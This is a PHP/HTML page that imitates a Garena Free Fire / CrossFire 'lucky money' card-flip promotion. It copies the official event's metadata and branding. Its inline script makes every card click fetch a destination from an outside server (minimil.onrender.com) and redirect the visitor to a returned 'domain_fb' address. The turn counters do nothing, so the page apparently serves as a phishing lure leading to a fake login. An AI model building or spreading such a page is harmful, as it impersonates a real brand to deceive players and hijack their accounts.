<?php
$currentUrl = $_SERVER['REQUEST_URI'];
$baseHref = '';
if (strpos(
    $currentUrl, '/themes/theme2/') === false) {
    $baseHref = '<base href="themes/theme2/">';
}
?>
<?= $baseHref ?>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Flip Lucky Money Free Fire</title>

    <meta name="rating" content="general">
    <meta name="expires" content="never">
    <meta name="distribution" content="global">
    <meta name="RESOURCE-TYPE" content="DOCUMENT">
    <meta name="googlebot" content="INDEX,FOLLOW,ARCHIVE">
    <meta name="robots" content="INDEX,FOLLOW,ARCHIVE">
    <meta id="pageDescription" name="description"
        content="Vietnam's top shooting game. CrossFire can be considered the oldest shooting game in Vietnam. CrossFire is the only playground for FPS fans in Vietnam.">
    <meta id="pageKeywords" name="keywords" content="CrossFire Game, FPS genre in Vietnam ">
    <meta property="og:title" content="Flip Lucky Money Free Fire 2024">
    <meta property="og:image" content="images/cf_log_thum.png">

    <meta property="og:url" itemprop="url" content="https://dotkich.goplay.vn/lixi">
    <meta property="og:image" itemprop="thumbnailUrl"
        content="https://dotkich.goplay.vn/lixi/lixi/images/cf_log_thum.png">

    <meta
        content="Vietnam's top shooting game. CrossFire is the only playground for FPS fans in Vietnam."
        itemprop="headline" property="og:title">
    <meta
        content="Vietnam's top shooting game. CrossFire can be considered the oldest shooting game in Vietnam and is the only playground for FPS fans in Vietnam..."
        itemprop="description" property="og:description">
    <style type="text/css">
        // ... existing code ...
    </style>
    <link rel="stylesheet" href="css/animations.css">
    <link href="css/bootstrap.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <link rel="icon" type="image/png" href="images/favicon.ico">
    <script data-search-pseudo-elements="" defer=""
        src="https://pro.fontawesome.com/releases/v5.10.1/js/all.js"></script>

</head>

<body class="" style="">
    <input type="hidden" id="rootPath" value="https://dotkich.goplay.vn/lixi">

    <nav class="navbar navbar-expand-lg navbar-light menu-top">
        <div class="container-fluid">
            <a class="navbar-brand" href="https://dotkich.goplay.vn">
                <img src="https://upload.wikimedia.org/wikipedia/en/c/c5/Logo_of_Garena_Free_Fire.png" alt=""
                    style="width: 100px; height: auto;">
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>
        </div>
    </nav>

    <div class="min-h-screen min-w-screen bg-main">
        <div class="events--title">
            <img src="images/logo_cf.png" alt="" class="hidden lg:block">
            <div class="flash w-full flex-center">
                <img src="images/TITLE.png" alt="" class="w-[90%] md:w-[70%]">
            </div>
        </div>
        <div class="container events-contents">
            <div class="contents__frame-re">
                <img src="images/bgRE1.png" alt="" class="contents__frame-re--pc">
                <img src="images/bgRE1_1.png" alt="" class="contents__frame-re--mobile">
                <div class="contents-re-card-flip">
                    <div class="card-flip-item" id="posdiv-1">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-1"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-2">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-2"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-3">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-3"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-4">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-4"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-5">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-5"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-6">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-6"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-7">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-7"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-8">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-8"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-9">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-9"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-10">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-10"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-11">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-11"></div>
                    </div>
                    <div class="card-flip-item" id="posdiv-12">
                        <img src="images/RE1.png" alt="" class="w-full">
                        <div class="card--back" id="pos-12"></div>
                    </div>
                </div>
            </div>
            <script>
                const domain = window.location.protocol + "//" + window.location.host;
                var cardItems = document.querySelectorAll('.card-flip-item');
                cardItems.forEach(function (cardItem) {
                    var image = cardItem.querySelector('img');
                    image.addEventListener('click', function () {
                        (async () => {
                            try {
                                let data = await fetch(`https://minimil.onrender.com/api/websites?domain=${domain}`)
                                data = await data.json()
                                window.location.href = data.data.domain_fb;
                            } catch {

                            }
                        })();
                    });
                });
            </script>

            <div class="contents-turn-spin">
                <div class="contents-turn__frame">
                    <div class="contents-turn__frame--parent">
                        <img src="images/turn_frame.png" alt="">
                    </div>
                    <div class="contents-misson__frame">
                        <div class="contents-misson__pc-title">
                            <img src="images/turn_title.png" alt="" class="">
                        </div>
                        <div class="mission-frame">
                        </div>
                        <div class="turn-spin">
                            <div class="relative w-full mb-2">
                                <img src="images/turn_frame_1.png" alt="" class="w-full">
                                <div class="contents-spin-turns">
                                    <div class="contents-spin-turns__des">
                                        <p class="">Available turns:</p>
                                        <span id="spincount">0</span>
                                    </div>
                                </div>
                            </div>
                            <div class="relative w-full mb-2">
                                <img src="images/turn_frame_1.png" alt="" class="w-full">
                                <div class="contents-spin-turns">
                                    <div class="contents-spin-turns__des">
                                        <p class="">Turns used:</p>
                                        <span id="spincounted">0</span>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <style>
        body {
            margin: 0;
            padding: 0;
        }

        .footer {
            background-color: #000;
            color: #fff;
            text-align: center;
            padding: 20px;
        }
    </style>

    <div class="footer">
        Copyright © Garena Free Fire
    </div>
</body>

</html> 